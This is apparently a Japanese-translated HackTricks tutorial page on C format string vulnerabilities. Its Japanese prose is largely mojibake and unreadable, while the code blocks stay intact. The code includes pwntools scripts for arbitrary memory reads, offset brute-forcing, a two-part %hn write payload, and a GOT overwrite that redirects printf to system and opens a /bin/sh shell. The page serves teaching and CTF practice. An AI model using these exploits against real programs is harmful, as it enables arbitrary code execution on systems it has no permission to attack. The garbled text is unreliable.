# ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**Telegramã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’æå‡ºã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}

## åŸºæœ¬æƒ…å ±

Cã®**`printf`**ã¯ã€ã„ãã¤ã‹ã®æ–‡å­—åˆ—ã‚’**å‡ºåŠ›**ã™ã‚‹ãŸã‚ã«ä½¿ç”¨ã§ãã‚‹é–¢æ•°ã§ã™ã€‚ã“ã®é–¢æ•°ãŒæœŸå¾…ã™ã‚‹**æœ€åˆã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã¯ã€**ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ãƒ¼ã‚’å«ã‚€ç”Ÿã®ãƒ†ã‚­ã‚¹ãƒˆ**ã§ã™ã€‚**æ¬¡ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿**ã¨ã—ã¦æœŸå¾…ã•ã‚Œã‚‹ã®ã¯ã€**ç”Ÿã®ãƒ†ã‚­ã‚¹ãƒˆã‹ã‚‰ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ãƒ¼ã‚’**ç½®ãæ›ãˆã‚‹ãŸã‚ã®**å€¤**ã§ã™ã€‚

ä»–ã®è„†å¼±ãªé–¢æ•°ã«ã¯**`sprintf()`**ã¨**`fprintf()`**ãŒã‚ã‚Šã¾ã™ã€‚

è„†å¼±æ€§ã¯ã€**æ”»æ’ƒè€…ã®ãƒ†ã‚­ã‚¹ãƒˆãŒã“ã®é–¢æ•°ã®æœ€åˆã®å¼•æ•°ã¨ã—ã¦ä½¿ç”¨ã•ã‚Œã‚‹ã¨ã**ã«ç¾ã‚Œã¾ã™ã€‚æ”»æ’ƒè€…ã¯ã€**printfãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆ**æ–‡å­—åˆ—ã®æ©Ÿèƒ½ã‚’æ‚ªç”¨ã—ã¦ã€**ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ï¼ˆèª­ã¿å–ã‚Šå¯èƒ½/æ›¸ãè¾¼ã¿å¯èƒ½ï¼‰ã«ã‚ã‚‹ä»»æ„ã®ãƒ‡ãƒ¼ã‚¿ã‚’èª­ã¿æ›¸ã**ã™ã‚‹ãŸã‚ã®**ç‰¹åˆ¥ãªå…¥åŠ›ã‚’ä½œæˆ**ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚ã“ã®æ–¹æ³•ã§**ä»»æ„ã®ã‚³ãƒ¼ãƒ‰ã‚’å®Ÿè¡Œ**ã™ã‚‹ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚

#### ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ãƒ¼ï¼š
```bash
%08x â€”> 8 hex bytes
%d â€”> Entire
%u â€”> Unsigned
%s â€”> String
%p â€”> Pointer
%n â€”> Number of written bytes
%hn â€”> Occupies 2 bytes instead of 4
<n>$X â€”> Direct access, Example: ("%3$d", var1, var2, var3) â€”> Access to var3
```
**ä¾‹:**

* è„†å¼±ãªä¾‹:
```c
char buffer[30];
gets(buffer);  // Dangerous: takes user input without restrictions.
printf(buffer);  // If buffer contains "%x", it reads from the stack.
```
* é€šå¸¸ã®ä½¿ç”¨:
```c
int value = 1205;
printf("%x %x %x", value, value, value);  // Outputs: 4b5 4b5 4b5
```
* å¼•æ•°ãŒæ¬ è½ã—ã¦ã„ã‚‹å ´åˆ:
```c
printf("%x %x %x", value);  // Unexpected output: reads random values from the stack.
```
* fprintf è„†å¼±æ€§:
```c
#include <stdio.h>

int main(int argc, char *argv[]) {
char *user_input;
user_input = argv[1];
FILE *output_file = fopen("output.txt", "w");
fprintf(output_file, user_input); // The user input cna include formatters!
fclose(output_file);
return 0;
}
```
### **ãƒã‚¤ãƒ³ã‚¿ã¸ã®ã‚¢ã‚¯ã‚»ã‚¹**

ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆ **`%<n>$x`** ã¯ã€`n` ãŒæ•°å­—ã§ã‚ã‚‹å ´åˆã€printf ã«ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ n ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’é¸æŠã™ã‚‹ã‚ˆã†æŒ‡ç¤ºã—ã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€printf ã‚’ä½¿ç”¨ã—ã¦ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ 4 ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’èª­ã¿å–ã‚ŠãŸã„å ´åˆã¯ã€æ¬¡ã®ã‚ˆã†ã«ã§ãã¾ã™:
```c
printf("%x %x %x %x")
```
ãã—ã¦ã€æœ€åˆã‹ã‚‰4ç•ªç›®ã®ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã¾ã§èª­ã¿å–ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

ã¾ãŸã¯ã€æ¬¡ã®ã‚ˆã†ã«ã™ã‚‹ã“ã¨ã‚‚ã§ãã¾ã™ï¼š
```c
printf("$4%x")
```
and read directly the forth.

æ”»æ’ƒè€…ãŒ `pr`**`intf` ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã‚’åˆ¶å¾¡ã—ã¦ã„ã‚‹ã“ã¨ã«æ³¨æ„ã—ã¦ãã ã•ã„ã€‚ã“ã‚Œã¯åŸºæœ¬çš„ã«ã€**å½¼ã®å…¥åŠ›ãŒ `printf` ãŒå‘¼ã³å‡ºã•ã‚Œã‚‹ã¨ãã«ã‚¹ã‚¿ãƒƒã‚¯ã«å­˜åœ¨ã™ã‚‹ã“ã¨ã‚’æ„å‘³ã—ã€ç‰¹å®šã®ãƒ¡ãƒ¢ãƒªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ã‚¹ã‚¿ãƒƒã‚¯ã«æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚‹ã“ã¨ã‚’æ„å‘³ã—ã¾ã™ã€‚**

{% hint style="danger" %}
ã“ã®å…¥åŠ›ã‚’åˆ¶å¾¡ã™ã‚‹æ”»æ’ƒè€…ã¯ã€**ã‚¹ã‚¿ãƒƒã‚¯ã«ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’è¿½åŠ ã—ã€`printf` ãŒãã‚Œã«ã‚¢ã‚¯ã‚»ã‚¹ã§ãã‚‹ã‚ˆã†ã«ã—ã¾ã™**ã€‚æ¬¡ã®ã‚»ã‚¯ã‚·ãƒ§ãƒ³ã§ã¯ã€ã“ã®å‹•ä½œã‚’ã©ã®ã‚ˆã†ã«åˆ©ç”¨ã™ã‚‹ã‹ãŒèª¬æ˜ã•ã‚Œã¾ã™ã€‚
{% endhint %}

## **ä»»æ„ã®èª­ã¿å–ã‚Š**

ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ **`%n$s`** ã‚’ä½¿ç”¨ã—ã¦ã€**`printf`** ãŒ **n ç•ªç›®ã®ä½ç½®ã«ã‚ã‚‹** **ã‚¢ãƒ‰ãƒ¬ã‚¹** ã‚’å–å¾—ã—ã€ãã‚Œã‚’ **æ–‡å­—åˆ—ã®ã‚ˆã†ã«å°åˆ·ã™ã‚‹**ï¼ˆ0x00 ãŒè¦‹ã¤ã‹ã‚‹ã¾ã§å°åˆ·ã™ã‚‹ï¼‰ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚ã—ãŸãŒã£ã¦ã€ãƒã‚¤ãƒŠãƒªã®ãƒ™ãƒ¼ã‚¹ã‚¢ãƒ‰ãƒ¬ã‚¹ãŒ **`0x8048000`** ã§ã‚ã‚Šã€ãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ãŒã‚¹ã‚¿ãƒƒã‚¯ã® 4 ç•ªç›®ã®ä½ç½®ã‹ã‚‰å§‹ã¾ã‚‹ã“ã¨ãŒã‚ã‹ã£ã¦ã„ã‚‹å ´åˆã€æ¬¡ã®ã‚ˆã†ã«ãƒã‚¤ãƒŠãƒªã®å…ˆé ­ã‚’å°åˆ·ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ï¼š
```python
from pwn import *

p = process('./bin')

payload = b'%6$s' #4th param
payload += b'xxxx' #5th param (needed to fill 8bytes with the initial input)
payload += p32(0x8048000) #6th param

p.sendline(payload)
log.info(p.clean()) # b'\x7fELF\x01\x01\x01||||'
```
{% hint style="danger" %}
ã‚¢ãƒ‰ãƒ¬ã‚¹0x8048000ã‚’å…¥åŠ›ã®æœ€åˆã«ç½®ãã“ã¨ã¯ã§ãã¾ã›ã‚“ã€‚ãªãœãªã‚‰ã€ãã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æœ€å¾Œã«0x00ã§æ–‡å­—åˆ—ãŒåˆ‡ã‚‰ã‚Œã‚‹ã‹ã‚‰ã§ã™ã€‚
{% endhint %}

### ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹

å…¥åŠ›ã®ã‚ªãƒ•ã‚»ãƒƒãƒˆã‚’è¦‹ã¤ã‘ã‚‹ãŸã‚ã«ã€4ã¾ãŸã¯8ãƒã‚¤ãƒˆï¼ˆ`0x41414141`ï¼‰ã‚’é€ä¿¡ã—ã€ãã®å¾Œã«**`%1$x`**ã‚’ç¶šã‘ã¦ã€`A`ã‚’å–å¾—ã™ã‚‹ã¾ã§å€¤ã‚’**å¢—ã‚„ã—ã¾ã™**ã€‚

<details>

<summary>ãƒ–ãƒ«ãƒ¼ãƒˆãƒ•ã‚©ãƒ¼ã‚¹printfã‚ªãƒ•ã‚»ãƒƒãƒˆ</summary>
```python
# Code from https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak

from pwn import *

# Iterate over a range of integers
for i in range(10):
# Construct a payload that includes the current integer as offset
payload = f"AAAA%{i}$x".encode()

# Start a new process of the "chall" binary
p = process("./chall")

# Send the payload to the process
p.sendline(payload)

# Read and store the output of the process
output = p.clean()

# Check if the string "41414141" (hexadecimal representation of "AAAA") is in the output
if b"41414141" in output:
# If the string is found, log the success message and break out of the loop
log.success(f"User input is at offset : {i}")
break

# Close the process
p.close()
```
</details>

### ã©ã‚Œã»ã©å½¹ç«‹ã¤ã‹

ä»»æ„ã®èª­ã¿å–ã‚Šã¯ä»¥ä¸‹ã«å½¹ç«‹ã¡ã¾ã™ï¼š

* **ãƒ¡ãƒ¢ãƒªã‹ã‚‰** **ãƒã‚¤ãƒŠãƒª**ã‚’**ãƒ€ãƒ³ãƒ—**ã™ã‚‹
* **æ©Ÿå¯†æƒ…å ±ãŒä¿å­˜ã•ã‚Œã¦ã„ã‚‹ãƒ¡ãƒ¢ãƒªã®ç‰¹å®šã®éƒ¨åˆ†ã«ã‚¢ã‚¯ã‚»ã‚¹ã™ã‚‹**ï¼ˆã‚«ãƒŠãƒªã‚¢ã€æš—å·åŒ–ã‚­ãƒ¼ã€ã¾ãŸã¯ã“ã®[**CTFãƒãƒ£ãƒ¬ãƒ³ã‚¸**](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak#read-arbitrary-value)ã®ã‚ˆã†ãªã‚«ã‚¹ã‚¿ãƒ ãƒ‘ã‚¹ãƒ¯ãƒ¼ãƒ‰ãªã©ï¼‰

## **ä»»æ„ã®æ›¸ãè¾¼ã¿**

ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ **`$<num>%n`** ã¯ã€ã‚¹ã‚¿ãƒƒã‚¯ã®\<num>ãƒ‘ãƒ©ãƒ¡ãƒ¼ã‚¿ã«ã‚ã‚‹**æŒ‡å®šã•ã‚ŒãŸã‚¢ãƒ‰ãƒ¬ã‚¹**ã«**æ›¸ãè¾¼ã¾ã‚ŒãŸãƒã‚¤ãƒˆæ•°**ã‚’**æ›¸ãè¾¼ã¿ã¾ã™**ã€‚æ”»æ’ƒè€…ãŒprintfã‚’ä½¿ã£ã¦ä»»æ„ã®æ•°ã®æ–‡å­—ã‚’æ›¸ãè¾¼ã‚€ã“ã¨ãŒã§ãã‚Œã°ã€**`$<num>%n`** ã‚’ä½¿ã£ã¦ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä»»æ„ã®æ•°ã‚’**æ›¸ãè¾¼ã‚€**ã“ã¨ãŒã§ãã¾ã™ã€‚

å¹¸ã„ãªã“ã¨ã«ã€9999ã¨ã„ã†æ•°ã‚’æ›¸ããŸã‚ã«ã€å…¥åŠ›ã«9999å€‹ã®"A"ã‚’è¿½åŠ ã™ã‚‹å¿…è¦ã¯ãªãã€ãƒ•ã‚©ãƒ¼ãƒãƒƒã‚¿ **`%.<num-write>%<num>$n`** ã‚’ä½¿ç”¨ã—ã¦ã€**`<num-write>`**ã¨ã„ã†æ•°ã‚’**`num`ä½ç½®ãŒæŒ‡ã™ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãè¾¼ã‚€**ã“ã¨ãŒå¯èƒ½ã§ã™ã€‚
```bash
AAAA%.6000d%4\$n â€”> Write 6004 in the address indicated by the 4Âº param
AAAA.%500\$08x â€”> Param at offset 500
```
ã—ã‹ã—ã€é€šå¸¸ã€`0x08049724`ã®ã‚ˆã†ãªã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ããŸã‚ã«ã¯ï¼ˆã“ã‚Œã¯ä¸€åº¦ã«æ›¸ãã«ã¯éå¸¸ã«å¤§ããªæ•°ã§ã™ï¼‰ã€**`$hn`**ãŒ**`$n`**ã®ä»£ã‚ã‚Šã«ä½¿ç”¨ã•ã‚Œã¾ã™ã€‚ã“ã‚Œã«ã‚ˆã‚Šã€**2ãƒã‚¤ãƒˆã ã‘ã‚’æ›¸ã**ã“ã¨ãŒã§ãã¾ã™ã€‚ã—ãŸãŒã£ã¦ã€ã“ã®æ“ä½œã¯2å›è¡Œã‚ã‚Œã€ã‚¢ãƒ‰ãƒ¬ã‚¹ã®æœ€ä¸Šä½2ãƒã‚¤ãƒˆã¨æœ€ä¸‹ä½2ãƒã‚¤ãƒˆã®ãã‚Œãã‚Œã«å¯¾ã—ã¦è¡Œã‚ã‚Œã¾ã™ã€‚

ã—ãŸãŒã£ã¦ã€ã“ã®è„†å¼±æ€§ã¯**ä»»æ„ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«ä½•ã§ã‚‚æ›¸ãè¾¼ã‚€ã“ã¨ã‚’å¯èƒ½ã«ã—ã¾ã™ï¼ˆä»»æ„æ›¸ãè¾¼ã¿ï¼‰ã€‚**

ã“ã®ä¾‹ã§ã¯ã€ç›®æ¨™ã¯**å¾Œã§å‘¼ã³å‡ºã•ã‚Œã‚‹**é–¢æ•°ã®**ã‚¢ãƒ‰ãƒ¬ã‚¹**ã‚’**ä¸Šæ›¸ã**ã™ã‚‹ã“ã¨ã§ã™ã€‚ã“ã‚Œã¯ä»–ã®ä»»æ„æ›¸ãè¾¼ã¿ã‹ã‚‰execæŠ€è¡“ã‚’æ‚ªç”¨ã™ã‚‹å¯èƒ½æ€§ãŒã‚ã‚Šã¾ã™ï¼š

{% content-ref url="../arbitrary-write-2-exec/" %}
[arbitrary-write-2-exec](../arbitrary-write-2-exec/)
{% endcontent-ref %}

ç§ãŸã¡ã¯ã€**ãƒ¦ãƒ¼ã‚¶ãƒ¼**ã‹ã‚‰**å¼•æ•°**ã‚’**å—ã‘å–ã‚‹**é–¢æ•°ã‚’**ä¸Šæ›¸ã**ã—ã€ãã‚Œã‚’**`system`**é–¢æ•°ã«**ãƒã‚¤ãƒ³ãƒˆ**ã—ã¾ã™ã€‚\
å‰è¿°ã®ã‚ˆã†ã«ã€ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ããŸã‚ã«ã¯é€šå¸¸2ã‚¹ãƒ†ãƒƒãƒ—ãŒå¿…è¦ã§ã™ï¼šæœ€åˆã«ã‚¢ãƒ‰ãƒ¬ã‚¹ã®2ãƒã‚¤ãƒˆã‚’æ›¸ãã€ãã®å¾Œã«æ®‹ã‚Šã®2ãƒã‚¤ãƒˆã‚’æ›¸ãã¾ã™ã€‚ãã®ãŸã‚ã«**`$hn`**ãŒä½¿ç”¨ã•ã‚Œã¾ã™ã€‚

* **HOB**ã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ä¸Šä½2ãƒã‚¤ãƒˆã«å‘¼ã³å‡ºã•ã‚Œã¾ã™
* **LOB**ã¯ã‚¢ãƒ‰ãƒ¬ã‚¹ã®ä¸‹ä½2ãƒã‚¤ãƒˆã«å‘¼ã³å‡ºã•ã‚Œã¾ã™

æ¬¡ã«ã€ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®å‹•ä½œã®ãŸã‚ã«ã€æœ€åˆã«\[HOB, LOB\]ã®ä¸­ã§æœ€å°ã®ã‚‚ã®ã‚’**æ›¸ãå¿…è¦ãŒã‚ã‚Šã¾ã™**ã€ãã®å¾Œã«ã‚‚ã†ä¸€æ–¹ã‚’æ›¸ãã¾ã™ã€‚

ã‚‚ã—HOB < LOB\
`[address+2][address]%.[HOB-8]x%[offset]\$hn%.[LOB-HOB]x%[offset+1]`

ã‚‚ã—HOB > LOB\
`[address+2][address]%.[LOB-8]x%[offset+1]\$hn%.[HOB-LOB]x%[offset]`

HOB LOB HOB\_shellcode-8 NÂºParam\_dir\_HOB LOB\_shell-HOB\_shell NÂºParam\_dir\_LOB

{% code overflow="wrap" %}
```bash
python -c 'print "\x26\x97\x04\x08"+"\x24\x97\x04\x08"+ "%.49143x" + "%4$hn" + "%.15408x" + "%5$hn"'
```
{% endcode %}

### Pwntools ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ

ã“ã®ç¨®ã®è„†å¼±æ€§ã«å¯¾ã™ã‚‹ã‚¨ã‚¯ã‚¹ãƒ—ãƒ­ã‚¤ãƒˆã‚’æº–å‚™ã™ã‚‹ãŸã‚ã®**ãƒ†ãƒ³ãƒ—ãƒ¬ãƒ¼ãƒˆ**ã¯ä»¥ä¸‹ã«ã‚ã‚Šã¾ã™:

{% content-ref url="format-strings-template.md" %}
[format-strings-template.md](format-strings-template.md)
{% endcontent-ref %}

ã¾ãŸã¯ã€[**ã“ã¡ã‚‰**](https://ir0nstone.gitbook.io/notes/types/stack/got-overwrite/exploiting-a-got-overwrite)ã®åŸºæœ¬çš„ãªä¾‹ã‚‚ã‚ã‚Šã¾ã™:
```python
from pwn import *

elf = context.binary = ELF('./got_overwrite-32')
libc = elf.libc
libc.address = 0xf7dc2000       # ASLR disabled

p = process()

payload = fmtstr_payload(5, {elf.got['printf'] : libc.sym['system']})
p.sendline(payload)

p.clean()

p.sendline('/bin/sh')

p.interactive()
```
## ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã‹ã‚‰BOFã¸

ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®è„†å¼±æ€§ã®æ›¸ãè¾¼ã¿ã‚¢ã‚¯ã‚·ãƒ§ãƒ³ã‚’æ‚ªç”¨ã—ã¦ã€**ã‚¹ã‚¿ãƒƒã‚¯ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãè¾¼ã‚€**ã“ã¨ãŒå¯èƒ½ã§ã‚ã‚Šã€**ãƒãƒƒãƒ•ã‚¡ã‚ªãƒ¼ãƒãƒ¼ãƒ•ãƒ­ãƒ¼**ã‚¿ã‚¤ãƒ—ã®è„†å¼±æ€§ã‚’æ‚ªç”¨ã™ã‚‹ã“ã¨ãŒã§ãã¾ã™ã€‚

## ãã®ä»–ã®ä¾‹ã¨å‚è€ƒæ–‡çŒ®

* [https://ir0nstone.gitbook.io/notes/types/stack/format-string](https://ir0nstone.gitbook.io/notes/types/stack/format-string)
* [https://www.youtube.com/watch?v=t1LH9D5cuK4](https://www.youtube.com/watch?v=t1LH9D5cuK4)
* [https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak](https://www.ctfrecipes.com/pwn/stack-exploitation/format-string/data-leak)
* [https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/pico18\_echo/index.html)
* 32ãƒ“ãƒƒãƒˆã€relroãªã—ã€canaryãªã—ã€nxã€pieãªã—ã€ã‚¹ã‚¿ãƒƒã‚¯ã‹ã‚‰ãƒ•ãƒ©ã‚°ã‚’æ¼æ´©ã•ã›ã‚‹ãŸã‚ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ã®åŸºæœ¬çš„ãªä½¿ç”¨ï¼ˆå®Ÿè¡Œãƒ•ãƒ­ãƒ¼ã‚’å¤‰æ›´ã™ã‚‹å¿…è¦ã¯ã‚ã‚Šã¾ã›ã‚“ï¼‰
* [https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/backdoor17\_bbpwn/index.html)
* 32ãƒ“ãƒƒãƒˆã€relroã‚ã‚Šã€canaryãªã—ã€nxã€pieãªã—ã€winé–¢æ•°ã§`fflush`ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’ä¸Šæ›¸ãã™ã‚‹ãŸã‚ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ï¼ˆret2winï¼‰
* [https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html](https://guyinatuxedo.github.io/10-fmt\_strings/tw16\_greeting/index.html)
* 32ãƒ“ãƒƒãƒˆã€relroã‚ã‚Šã€canaryãªã—ã€nxã€pieãªã—ã€`.fini_array`å†…ã®mainã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã«æ›¸ãè¾¼ã‚€ãŸã‚ã®ãƒ•ã‚©ãƒ¼ãƒãƒƒãƒˆæ–‡å­—åˆ—ï¼ˆãƒ•ãƒ­ãƒ¼ãŒã‚‚ã†1å›ãƒ«ãƒ¼ãƒ—ãƒãƒƒã‚¯ã™ã‚‹ã‚ˆã†ã«ï¼‰ãŠã‚ˆã³`strlen`ã‚’æŒ‡ã™GOTãƒ†ãƒ¼ãƒ–ãƒ«å†…ã®`system`ã¸ã®ã‚¢ãƒ‰ãƒ¬ã‚¹ã‚’æ›¸ãè¾¼ã‚€ã€‚ãƒ•ãƒ­ãƒ¼ãŒmainã«æˆ»ã‚‹ã¨ã€`strlen`ãŒãƒ¦ãƒ¼ã‚¶ãƒ¼å…¥åŠ›ã§å®Ÿè¡Œã•ã‚Œã€`system`ã‚’æŒ‡ã™ã¨ã€æ¸¡ã•ã‚ŒãŸã‚³ãƒãƒ³ãƒ‰ãŒå®Ÿè¡Œã•ã‚Œã¾ã™ã€‚

{% hint style="success" %}
AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCPãƒãƒƒã‚­ãƒ³ã‚°ã‚’å­¦ã³ã€ç·´ç¿’ã™ã‚‹ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹</summary>

* [**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ç¢ºèªã—ã¦ãã ã•ã„ï¼
* **ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã¾ãŸã¯[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã‹ã€**Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**ã‚’ãƒ•ã‚©ãƒ­ãƒ¼ã—ã¦ãã ã•ã„ã€‚**
* **ãƒãƒƒã‚­ãƒ³ã‚°ã®ãƒˆãƒªãƒƒã‚¯ã‚’å…±æœ‰ã™ã‚‹ã«ã¯ã€[**HackTricks**](https://github.com/carlospolop/hacktricks)ãŠã‚ˆã³[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã®GitHubãƒªãƒã‚¸ãƒˆãƒªã«PRã‚’é€ä¿¡ã—ã¦ãã ã•ã„ã€‚**

</details>
{% endhint %}
